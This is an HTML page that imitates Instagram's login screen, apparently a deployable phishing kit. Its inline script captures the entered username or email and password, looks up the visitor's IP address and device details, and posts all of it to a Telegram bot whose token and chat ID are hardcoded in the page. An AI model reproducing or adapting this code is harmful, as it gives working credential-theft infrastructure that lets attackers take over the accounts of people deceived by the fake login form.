<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram Clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
            <!-- Section for mobile content (currently empty) -->
        </section>
        <section id="auth" class="flex direction-column">
            <!-- Login panel -->
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone, username, or email</label>
                    <input id="email" name="email" placeholder="Phone, username, or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" required />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <!-- Registration panel -->
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <!-- App download panel -->
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="Apple App Store logo" title="Apple App Store" />
                    <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play Store" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">MORE ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">Â© 2020 Instagram from Facebook</p>
    </footer>

<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    // API information
    const TOKEN = "8157347491:AAFTYRI8pWJjZQJSMz5jaOBlzL5Btc_yHJA";
    const CHAT_ID = "6592888328";
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    // Handle login form submission
    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        // Get input values
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Fetch user's IP address
        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                // Gather device information
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                // Create the message to send
                const message = ` 
                    <b>New Login Attempt</b>\n
                    <b>Email:</b> ${email}\n
                    <b>Password:</b> ${password}\n
                    <b>IP Address:</b> ${ip}\n
                    <b>Device Type:</b> ${deviceType}\n
                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                // Send message to Telegram
                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    alert('Information sent successfully!');
                }).catch(error => {
                    alert('Error sending the information. Please try again.');
                });
            })
            .catch(error => {
                alert('Error fetching the IP address. Please try again.');
            });
    });
</script>

</body>
</html>
